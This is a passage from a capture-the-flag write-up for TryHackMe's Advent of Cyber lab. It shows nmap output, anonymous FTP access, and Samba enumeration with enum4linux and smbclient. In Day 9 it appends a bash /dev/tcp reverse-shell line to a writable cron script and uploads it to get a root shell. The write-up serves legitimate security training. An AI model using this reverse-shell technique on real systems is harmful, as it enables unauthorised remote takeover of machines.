what%20OS%20is%20running%20on%20it,%20see%20https://nmap.org/submit/%20).%0ATCP/IP%20fingerprint:%0AOS:SCAN(V=7.60%25E=4%25D=1/20%25OT=80%25CT=1%25CU=37344%25PV=Y%25DS=1%DC=D%25G=Y%25M=0240D3%25T%0AOS:M=6007A0BA%25P=x86_64-pc-linux-gnu)SEQ(SP=107%25GCD=1%25ISR=108%25TI=Z%25CI=Z%25TS=A%0AOS:)SEQ(SP=107%25GCD=1%25ISR=108%25TI=Z%25CI=Z%25II=I%25TS=A)OPS(O1=M2301ST11NW7%25O2=M23%0AOS:01ST11NW7%25O3=M2301NNT11NW7%25O4=M2301ST11NW7%25O5=M2301ST11NW7%25O6=M2301ST11)%0AOS:WIN(W1=F4B3%25W2=F4B3%25W3=F4B3%25W4=F4B3%25W5=F4B3%25W6=F4B3)ECN(R=Y%DF=Y%25T=40%25W=%0AOS:F507%25O=M2301NNSNW7%CC=Y%25Q=)T1(R=Y%DF=Y%25T=40%25S=O%25A=S+%25F=AS%25RD=0%25Q=)T2(R=N%0AOS:)T3(R=N)T4(R=Y%DF=Y%25T=40%25W=0%25S=A%25A=Z%25F=R%25O=%25RD=0%25Q=)T5(R=Y%DF=Y%25T=40%25W=0%0AOS:%25S=Z%25A=S+%25F=AR%25O=%25RD=0%25Q=)T6(R=Y%DF=Y%25T=40%25W=0%25S=A%25A=Z%25F=R%25O=%25RD=0%25Q=)T7%0AOS:(R=Y%DF=Y%25T=40%25W=0%25S=Z%25A=S+%25F=AR%25O=%25RD=0%25Q=)U1(R=Y%DF=N%25T=40%25IPL=164%25UN=%0AOS:0%25RIPL=G%25RID=G%25RIPCK=G%25RUCK=G%25RUD=G)IE(R=Y%DFI=N%25T=40%CD=S)%0A%0ANetwork%20Distance:%201%20hop%0AService%20Info:%20OS:%20Linux;%20CPE:%20cpe:/o:linux:linux_kernel%0A%0ATRACEROUTE%0AHOP%20RTT%20%20%20%20%20ADDRESS%0A1%20%20%200.83%20ms%20tbfc.blog%20(%3Cip%3E)%0A%0AOS%20and%20Service%20detection%20performed.%20Please%20report%20any%20incorrect%20results%20at%20https://nmap.org/submit/%20.%0ANmap%20done:%201%20IP%20address%20(1%20host%20up)%20scanned%20in%2081.87%20seconds" type="button"></button></div></div><pre><code>Starting Nmap 7.60 ( https://nmap.org ) at 2021-01-20 03:15 GMT
+Nmap scan report for tbfc.blog (&lt;ip&gt;)
+Host is up, received arp-response (0.00083s latency).
+Not shown: 997 closed ports
+Reason: 997 resets
+PORT     STATE SERVICE       REASON         VERSION
+&lt;port&gt;/tcp   open  http          syn-ack ttl 64 Apache httpd 2.4.29 ((&lt;OS&gt;))
+|_http-generator: Hugo 0.78.2
+|_http-server-header: Apache/2.4.29 (&lt;OS&gt;)
+|_http-title: TBFC&amp;#39;s &lt;website-type&gt;
+&lt;port&gt;/tcp open  ssh           syn-ack ttl 64 OpenSSH 7.6p1 &lt;OS&gt; 4&lt;OS&gt;0.3 (&lt;OS&gt; Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 cf:c9:99:d0:5c:09:27:cd:a1:a8:1b:c2:b1:d5:ef:a6 (RSA)
+|   256 4c:d4:f9:20:6b:ce:fc:62:99:54:7d:c2:b4:b2:f2:b2 (ECDSA)
+|_  256 d0:e6:72:18:b5:20:89:75:d5:69:74:ac:cc:b8:3b:9b (EdDSA)
+&lt;port&gt;/tcp open  ms-wbt-server syn-ack ttl 64 xrdp
+MAC Address: 02:40:D3:C4:50:2D (Unknown)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=1/20%OT=80%CT=1%CU=37344%PV=Y%DS=1%DC=D%G=Y%M=0240D3%T
+OS:M=6007A0BA%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=108%TI=Z%CI=Z%TS=A
+OS:)SEQ(SP=107%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M23
+OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
+OS:WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=
+OS:F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
+OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
+OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
+OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
+OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.83 ms tbfc.blog (&lt;ip&gt;)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 81.87 seconds
+</code></pre><h2 id="task-14---day-9---networking---anyone-can-be-santa">Task 14 - Day 9 - Networking - Anyone can be Santa!</h2><p>This task is about using <code>ftp</code> to and uploading a reverse shell payload to gain privilege shell.</p><h3 id="references-8">References</h3><ul><li><a href="https://www.youtube.com/watch?v=i-jqFYTPEV4" target="_blank">TryHackMe supporting material</a><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp" target="_blank">Reverse Shell Cheat sheet</a></ul><p>Use <code>ftp</code> to login to the server using <code>anonymous</code> and check the public accessible files and folders.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="ftp%20%3Cip%3E" type="button"></button></div></div><pre><code>ftp &lt;ip&gt;
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Connected%20to%20%3Cip%3E.%0A220%20Welcome%20to%20the%20TBFC%20FTP%20Server!.%0AName%20(%3Cip%3E:root):%20anonymous%0A230%20Login%20successful.%0ARemote%20system%20type%20is%20UNIX.%0AUsing%20binary%20mode%20to%20transfer%20files." type="button"></button></div></div><pre><code>Connected to &lt;ip&gt;.
+220 Welcome to the TBFC FTP Server!.
+Name (&lt;ip&gt;:root): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</code></pre><p>Check the files and folders and download any interesting files.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="ftp%3E%20ls%0A200%20PORT%20command%20successful.%20Consider%20using%20PASV.%0A150%20Here%20comes%20the%20directory%20listing.%0Adrwxr-xr-x%20%20%20%202%200%20%20%20%20%20%20%20%200%20%20%20%20%20%20%20%20%20%20%20%204096%20Nov%2016%2015:04%20%3Cfolder%3E%0Adrwxr-xr-x%20%20%20%202%200%20%20%20%20%20%20%20%200%20%20%20%20%20%20%20%20%20%20%20%204096%20Nov%2016%2015:05%20%3Cfolder%3E%0Adrwxr-xr-x%20%20%20%202%200%20%20%20%20%20%20%20%200%20%20%20%20%20%20%20%20%20%20%20%204096%20Nov%2016%2015:04%20%3Cfolder%3E%0Adrwxrwxrwx%20%20%20%202%2065534%20%20%20%2065534%20%20%20%20%20%20%20%204096%20Nov%2016%2019:35%20%3Cfolder%3E%0A226%20Directory%20send%20OK.%0A%0Aftp%3E%20cd%20%3Cfolder%3E%0A250%20Directory%20successfully%20changed.%0A%0Aftp%3E%20ls%0A200%20PORT%20command%20successful.%20Consider%20using%20PASV.%0A150%20Here%20comes%20the%20directory%20listing.%0A-rwxr-xr-x%20%20%20%201%20111%20%20%20%20%20%20113%20%20%20%20%20%20%20%20%20%20%20341%20Nov%2016%2019:34%20%3Cscript%3E.sh%0A-rw-rw-rw-%20%20%20%201%20111%20%20%20%20%20%20113%20%20%20%20%20%20%20%20%20%20%20%2024%20Nov%2016%2019:35%20shoppinglist.txt%0A226%20Directory%20send%20OK.%0A%0Aftp%3E%20mget%20%3Cscript%3E.sh%0Amget%20%3Cscript%3E.sh?%20y%0A200%20PORT%20command%20successful.%20Consider%20using%20PASV.%0A150%20Opening%20BINARY%20mode%20data%20connection%20for%20%3Cscript%3E.sh%20(341%20bytes).%0A226%20Transfer%20complete.%0A341%20bytes%20received%20in%200.00%20secs%20(108.7195%20kB/s)%0A%0Aftp%3E%20mget%20shoppinglist.txt%0Amget%20shoppinglist.txt?%20y%0A200%20PORT%20command%20successful.%20Consider%20using%20PASV.%0A150%20Opening%20BINARY%20mode%20data%20connection%20for%20shoppinglist.txt%20(24%20bytes).%0A226%20Transfer%20complete.%0A24%20bytes%20received%20in%200.00%20secs%20(468.7500%20kB/s)%0A%0Aftp%3E%20exit%0A221%20Goodbye." type="button"></button></div></div><pre><code>ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Nov 16 15:04 &lt;folder&gt;
+drwxr-xr-x    2 0        0            4096 Nov 16 15:05 &lt;folder&gt;
+drwxr-xr-x    2 0        0            4096 Nov 16 15:04 &lt;folder&gt;
+drwxrwxrwx    2 65534    65534        4096 Nov 16 19:35 &lt;folder&gt;
+226 Directory send OK.
+
+ftp&gt; cd &lt;folder&gt;
+250 Directory successfully changed.
+
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxr-xr-x    1 111      113           341 Nov 16 19:34 &lt;script&gt;.sh
+-rw-rw-rw-    1 111      113            24 Nov 16 19:35 shoppinglist.txt
+226 Directory send OK.
+
+ftp&gt; mget &lt;script&gt;.sh
+mget &lt;script&gt;.sh? y
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for &lt;script&gt;.sh (341 bytes).
+226 Transfer complete.
+341 bytes received in 0.00 secs (108.7195 kB/s)
+
+ftp&gt; mget shoppinglist.txt
+mget shoppinglist.txt? y
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for shoppinglist.txt (24 bytes).
+226 Transfer complete.
+24 bytes received in 0.00 secs (468.7500 kB/s)
+
+ftp&gt; exit
+221 Goodbye.
+</code></pre><p>Upon inspecting the <code>script</code> file downloaded, it looks like a scheduled task which runs every minute. Edit the file and append a reverse shell payload, so the file can be uploaded to ftp to gain reverse shell.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="#!/bin/bash%0A%0A#%20Created%20by%20ElfMcEager%20to%20backup%20all%20of%20Santa's%20goodies!%0A#%20Santa%20likes%20to%20delete%20things,%20so%20this%20script%20will%20run%20every%20minute.%0A#%20But%20the%20script%20will%20only%20create%20a%20new%20backup%20file%20once%20a%20new%20day%20arrives.%0A%0A#%20Create%20backups%20to%20include%20date%20DD/MM/YYYY%0Afilename=%22backup_%60date%20+%25d%60_%60date%20+%25m%60_%60date%20+%25Y%60.tar.gz%22;%0A%0A#%20Backup%20FTP%20folder%20and%20store%20in%20elfmceager's%20home%20directory%0Atar%20-zcvf%20/home/elfmceager/$filename%20/opt/ftp%0A%0A#%20TO-DO:%20Automate%20transfer%20of%20backups%20to%20backup%20server%0A%0A#%20Add%20payload%20for%20reverse%20shell%0Abash%20-i%20%3E&amp;%20/dev/tcp/%3Clocal-ip%3E/4444%200%3E&amp;1" type="button"></button></div></div><pre><code>#!/bin/bash
+
+# Created by ElfMcEager to backup all of Santa's goodies!
+# Santa likes to delete things, so this script will run every minute.
+# But the script will only create a new backup file once a new day arrives.
+
+# Create backups to include date DD/MM/YYYY
+filename="backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz";
+
+# Backup FTP folder and store in elfmceager's home directory
+tar -zcvf /home/elfmceager/$filename /opt/ftp
+
+# TO-DO: Automate transfer of backups to backup server
+
+# Add payload for reverse shell
+bash -i &gt;&amp; /dev/tcp/&lt;local-ip&gt;/4444 0&gt;&amp;1
+</code></pre><p>Using <code>netcat</code>, create a listener for reverse shell.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nc%20-lnvp%204444" type="button"></button></div></div><pre><code>nc -lnvp 4444
+</code></pre><p>Use <code>ftp</code> to login to the machine with user <code>anonymous</code> and upload the <code>script</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Connected%20to%20%3Cip%3E.%0A%0A220%20Welcome%20to%20the%20TBFC%20FTP%20Server!.%0AName%20(%3Cip%3E:root):%20anonymous%0A%0A230%20Login%20successful.%0ARemote%20system%20type%20is%20UNIX.%0AUsing%20binary%20mode%20to%20transfer%20files.%0A%0Aftp%3E%20cd%20%3Cfolder%3E%0A250%20Directory%20successfully%20changed.%0A%0Aftp%3E%20mput%20%3Cscript%3E.sh%0Amput%20%3Cscript%3E.sh?%20y%0A200%20PORT%20command%20successful.%20Consider%20using%20PASV.%0A150%20Ok%20to%20send%20data.%0A226%20Transfer%20complete.%0A383%20bytes%20sent%20in%200.00%20secs%20(9.3656%20MB/s)%0A%0Aftp%3E%20exit%0A221%20Goodbye." type="button"></button></div></div><pre><code>Connected to &lt;ip&gt;.
+
+220 Welcome to the TBFC FTP Server!.
+Name (&lt;ip&gt;:root): anonymous
+
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp&gt; cd &lt;folder&gt;
+250 Directory successfully changed.
+
+ftp&gt; mput &lt;script&gt;.sh
+mput &lt;script&gt;.sh? y
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+383 bytes sent in 0.00 secs (9.3656 MB/s)
+
+ftp&gt; exit
+221 Goodbye.
+</code></pre><p>Check the <code>netcat</code> session for reverse shell to get spawned.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Connection%20from%20%3Cip%3E%2053622%20received!%0Abash:%20cannot%20set%20terminal%20process%20group%20(1530):%20Inappropriate%20ioctl%20for%20device%0Abash:%20no%20job%20control%20in%20this%20shell%0A%0Aroot@tbfc-ftp-01:~#%20ls%0Als%0Aflag.txt%0A%0Aroot@tbfc-ftp-01:~#%20cat%20flag.txt%0Acat%20flag.txt%0A%20%20%3Cflag%3E" type="button"></button></div></div><pre><code>Connection from &lt;ip&gt; 53622 received!
+bash: cannot set terminal process group (1530): Inappropriate ioctl for device
+bash: no job control in this shell
+
+root@tbfc-ftp-01:~# ls
+ls
+flag.txt
+
+root@tbfc-ftp-01:~# cat flag.txt
+cat flag.txt
+  &lt;flag&gt;
+</code></pre><h2 id="task-15---day-10---networking---dont-be-selfish">Task 15 - Day 10 - Networking - Don’t be sElfish!</h2><p>This task is about using <code>enum4linux</code> to scan <code>samba</code> users and shares and using <code>smbclient</code> to exploit the share.</p><h3 id="references-9">References</h3><ul><li><a href="https://www.youtube.com/watch?v=HscyCbModk4" target="_blank">TryHackMe supporting material</a><li><a href="https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-enum4linux" target="_blank">Enum4Linux Reference</a></ul><p>Use <code>enum4linux</code> to enumerate the user information from <code>samba</code> server.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="enum4linux%20-U%20%3Cip%3E" type="button"></button></div></div><pre><code>enum4linux -U &lt;ip&gt;
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Starting%20enum4linux%20v0.8.9%20(%20http://labs.portcullis.co.uk/application/enum4linux/%20)%20on%20Fri%20Jan%2022%2013:44:13%202021%0A%0ATarget%20Information%0A%0ATarget%20...........%20%3Cip%3E%0ARID%20Range%20........%20500-550,1000-1050%0AUsername%20.........%20''%0APassword%20.........%20''%0AKnown%20Usernames%20..%20administrator,%20guest,%20krbtgt,%20domain%20admins,%20root,%20bin,%20none%0A%0A%0AEnumerating%20Workgroup/Domain%20on%20%3Cip%3E%0A%0A[+]%20Got%20domain/workgroup%20name:%20TBFC-SMB-01%0A%0A%0ASession%20Check%20on%20%3Cip%3E%0A%0A[+]%20Server%20%3Cip%3E%20allows%20sessions%20using%20username%20'',%20password%20''%0A%0A%0AGetting%20domain%20SID%20for%20%3Cip%3E%0A%0ADomain%20Name:%20TBFC-SMB-01%0ADomain%20Sid:%20(NULL%20SID)%0A[+]%20Can't%20determine%20if%20host%20is%20part%20of%20domain%20or%20part%20of%20a%20workgroup%0A%0A%0AUsers%20on%20%3Cip%3E%0A%0Aindex:%200x1%20RID:%200x3e8%20acb:%200x00000010%20Account:%20elfmcskidy%09Name:%20%09Desc:%0Aindex:%200x2%20RID:%200x3ea%20acb:%200x00000010%20Account:%20elfmceager%09Name:%20elfmceager%09Desc:%0Aindex:%200x3%20RID:%200x3e9%20acb:%200x00000010%20Account:%20elfmcelferson%09Name:%20%09Desc:%0A%0Auser:[elfmcskidy]%20rid:[0x3e8]%0Auser:[elfmceager]%20rid:[0x3ea]%0Auser:[elfmcelferson]%20rid:[0x3e9]%0A%0Aenum4linux%20complete%20on%20Fri%20Jan%2022%2013:44:15%202021" type="button"></button></div></div><pre><code>Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jan 22 13:44:13 2021
+
+Target Information
+
+Target ........... &lt;ip&gt;
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+Enumerating Workgroup/Domain on &lt;ip&gt;
+
+[+] Got domain/workgroup name: TBFC-SMB-01
+
+
+Session Check on &lt;ip&gt;
+
+[+] Server &lt;ip&gt; allows sessions using username '', password ''
+
+
+Getting domain SID for &lt;ip&gt;
+
+Domain Name: TBFC-SMB-01
+Domain Sid: (NULL SID)
+[+] Can't determine if host is part of domain or part of a workgroup
+
+
+Users on &lt;ip&gt;
+
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: elfmcskidy	Name: 	Desc:
+index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elfmceager	Name: elfmceager	Desc:
+index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: elfmcelferson	Name: 	Desc:
+
+user:[elfmcskidy] rid:[0x3e8]
+user:[elfmceager] rid:[0x3ea]
+user:[elfmcelferson] rid:[0x3e9]
+
+enum4linux complete on Fri Jan 22 13:44:15 2021
+</code></pre><p>Use <code>enum4linux</code> to enumerate the share information from <code>samba</code> server.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="enum4linux%20-S%20%3Cip%3E" type="button"></button></div></div><pre><code>enum4linux -S &lt;ip&gt;
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Starting%20enum4linux%20v0.8.9%20(%20http://labs.portcullis.co.uk/application/enum4linux/%20)%20on%20Fri%20Jan%2022%2013:48:31%202021%0A%0A%0ATarget%20Information%0A%0ATarget%20...........%20%3Cip%3E%0ARID%20Range%20........%20500-550,1000-1050%0AUsername%20.........%20''%0APassword%20.........%20''%0AKnown%20Usernames%20..%20administrator,%20guest,%20krbtgt,%20domain%20admins,%20root,%20bin,%20none%0A%0A%0AEnumerating%20Workgroup/Domain%20on%20%3Cip%3E%0A%0A[+]%20Got%20domain/workgroup%20name:%20TBFC-SMB-01%0A%0A%0ASession%20Check%20on%20%3Cip%3E%0A%0A[+]%20Server%20%3Cip%3E%20allows%20sessions%20using%20username%20'',%20password%20''%0A%0A%0AGetting%20domain%20SID%20for%20%3Cip%3E%0A%0ADomain%20Name:%20TBFC-SMB-01%0ADomain%20Sid:%20(NULL%20SID)%0A[+]%20Can't%20determine%20if%20host%20is%20part%20of%20domain%20or%20part%20of%20a%20workgroup%0A%0A%0AShare%20Enumeration%20on%20%3Cip%3E%0A%0A%20%20%20%20Sharename%20%20%20%20%20%20%20Type%20%20%20%20%20%20Comment%0A%20%20%20%20---------%20%20%20%20%20%20%20----%20%20%20%20%20%20-------%0A%20%20%20%20tbfc-hr%20%20%20%20%20%20%20%20%20Disk%20%20%20%20%20%20tbfc-hr%0A%20%20%20%20tbfc-it%20%20%20%20%20%20%20%20%20Disk%20%20%20%20%20%20tbfc-it%0A%20%20%20%20%3Cshare%3E%20%20%20%20%20%20%20%20%20Disk%20%20%20%20%20%20%3Cshare%3E%0A%20%20%20%20IPC$%20%20%20%20%20%20%20%20%20%20%20%20IPC%20%20%20%20%20%20%20IPC%20Service%20(tbfc-smb%20server%20(Samba,%20Ubuntu))%0A%0AReconnecting%20with%20SMB1%20for%20workgroup%20listing.%0A%0A%20%20%20%20Server%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Comment%0A%20%20%20%20---------%20%20%20%20%20%20%20%20%20%20%20%20-------%0A%0A%20%20%20%20Workgroup%20%20%20%20%20%20%20%20%20%20%20%20Master%0A%20%20%20%20---------%20%20%20%20%20%20%20%20%20%20%20%20-------%0A%20%20%20%20TBFC-SMB-01%20%20%20%20%20%20%20%20%20%20TBFC-SMB%0A%0A[+]%20Attempting%20to%20map%20shares%20on%20%3Cip%3E%0A//%3Cip%3E/tbfc-hr%09Mapping:%20DENIED,%20Listing:%20N/A%0A//%3Cip%3E/tbfc-it%09Mapping:%20DENIED,%20Listing:%20N/A%0A//%3Cip%3E/%3Cshare%3E%09Mapping:%20OK,%20Listing:%20OK%0A%0Aenum4linux%20complete%20on%20Fri%20Jan%2022%2013:48:31%202021" type="button"></button></div></div><pre><code>Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jan 22 13:48:31 2021
+
+
+Target Information
+
+Target ........... &lt;ip&gt;
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+Enumerating Workgroup/Domain on &lt;ip&gt;
+
+[+] Got domain/workgroup name: TBFC-SMB-01
+
+
+Session Check on &lt;ip&gt;
+
+[+] Server &lt;ip&gt; allows sessions using username '', password ''
+
+
+Getting domain SID for &lt;ip&gt;
+
+Domain Name: TBFC-SMB-01
+Domain Sid: (NULL SID)
+[+] Can't determine if host is part of domain or part of a workgroup
+
+
+Share Enumeration on &lt;ip&gt;
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    tbfc-hr         Disk      tbfc-hr
+    tbfc-it         Disk      tbfc-it
+    &lt;share&gt;         Disk      &lt;share&gt;
+    IPC$            IPC       IPC Service (tbfc-smb server (Samba, Ubuntu))
+
+Reconnecting with SMB1 for workgroup listing.
+
+    Server               Comment
+    ---------            -------
+
+    Workgroup            Master
+    ---------            -------
+    TBFC-SMB-01          TBFC-SMB
+
+[+] Attempting to map shares on &lt;ip&gt;
+//&lt;ip&gt;/tbfc-hr	Mapping: DENIED, Listing: N/A
+//&lt;ip&gt;/tbfc-it	Mapping: DENIED, Listing: N/A
+//&lt;ip&gt;/&lt;share&gt;	Mapping: OK, Listing: OK
+
+enum4linux complete on Fri Jan 22 13:48:31 2021
+</code></pre><p>Use <code>smbclient</code> to access the public share which was discovered previously.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="smbclient%20//%3Cip%3E/%3Cshare%3E" type="button"></button></div></div><pre><code>smbclient //&lt;ip&gt;/&lt;share&gt;
+</code></pre><p>An output similar to below will be obtained.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="Enter%20WORKGROUP%5Croot's%20password:%0ATry%20%22help%22%20to%20get%20a%20list%20of%20possible%20commands.%0A%0Asmb:%20%5C%3E%20ls%0A.%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20D%20%20%20%20%20%20%20%200%20%20Thu%20Nov%2012%2002:12:07%202020%0A..%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20D%20%20%20%20%20%20%20%200%20%20Thu%20Nov%2012%2001:32:21%202020%0A%3Cdirectory%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20D%20%20%20%20%20%20%20%200%20%20Thu%20Nov%2012%2002:10:41%202020%0Anote_from_mcskidy.txt%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20N%20%20%20%20%20%20143%20%20Thu%20Nov%2012%2002:12:07%202020%0A%0A%20%20%20%20%20%20%20%2010252564%20blocks%20of%20size%201024.%205368132%20blocks%20available%0A%0Asmb:%20%5C%3E%20mget%20note_from_mcskidy.txt%0AGet%20file%20note_from_mcskidy.txt?%20y%0Agetting%20file%20%5Cnote_from_mcskidy.txt%20of%20size%20143%20as%20note_from_mcskidy.txt%20(46.5%20KiloBytes/sec)%20(average%2046.5%20KiloBytes/sec)%0A%0Asmb:%20%5C%3E%20exit" type="button"></button></div></div><pre><code>Enter WORKGROUP\root's password:
+Try "help" to get a list of possible commands.
+
+smb: \&gt; ls
+.                                   D        0  Thu Nov 12 02:12:07 2020
+..                                  D        0  Thu Nov 12 01:32:21 2020
+&lt;directory&gt;                         D        0  Thu Nov 12 02:10:41 2020
+note_from_mcskidy.txt               N      143  Thu Nov 12 02:12:07 2020
+
+        10252564 blocks of size 1024. 5368132 blocks available
+
+smb: \&gt; mget note_from_mcskidy.txt
+Get file note_from_mcskidy.txt? y
+getting file \note_from_mcskidy.txt of size 143 as note_from_mcskidy.txt (46.5 KiloBytes/sec) (average 46.5 KiloBytes/sec)
+
+smb: \&gt; exit
+</code></pre></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/tryhackme/'>TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/tryhackme/" class="post-tag no-text-decoration" >tryhackme</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/network/" class="post-tag no-text-decoration" >network</a> <a href="/tags/protocols/" class="post-tag no-text-decoration" >protocols</a> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/database/" class="post-tag no-text-decoration" >database</a> <a href="/tags/binary/" class="post-tag no-text-decoration" >binary</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >privesc</a> <a href="/tags/osint/" class="post-tag no-text-decoration" >osint</a> <a href="/tags/cloud/" class="post-tag no-text-decoration" >cloud</a> <a href="/tags/encryption/" class="post-tag no-text-decoration" >encryption</a></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/tryhackme-network-services/"><div class="card-body"> <span class="timeago small" > Dec 11, 2020 <i class="unloaded">2020-12-11T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Network Services</h3><div class="text-muted small"><p> Network Services This room contains info and methods to recon and enumerate SMB, Telnet and FTP For complete tryhackme path, refer the link SMB Task 2 - Understanding SMB References S...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-network-services-2/"><div class="card-body"> <span class="timeago small" > Dec 13, 2020 <i class="unloaded">2020-12-13T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Network Services 2</h3><div class="text-muted small"><p> Network Services This room contains info and methods to recon and enumerate SMB, Telnet and FTP For complete tryhackme path, refer the link NFS Task 2 - Understanding NFS References N...</p></div></div></a></div><div class="card"> <a href="/posts/tryhackme-alfred/"><div class="card-body"> <span class="timeago small" > Mar 22 <i class="unloaded">2021-03-22T00:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writeup for TryHackMe room - Alfred</h3><div class="text-muted small"><p> Alfred This room contains detailed info about jenkins exploitation and windows privilege escalation methods. For complete tryhackme path, refer the link. Tools Used Enumeration NMAP ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/tryhackme-advent-of-cyber/" class="btn btn-outline-primary"><p>Writeup for TryHackMe room - Advent of Cyber</p></a> <span class="btn btn-outline-primary disabled"><p>-</p></span></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p 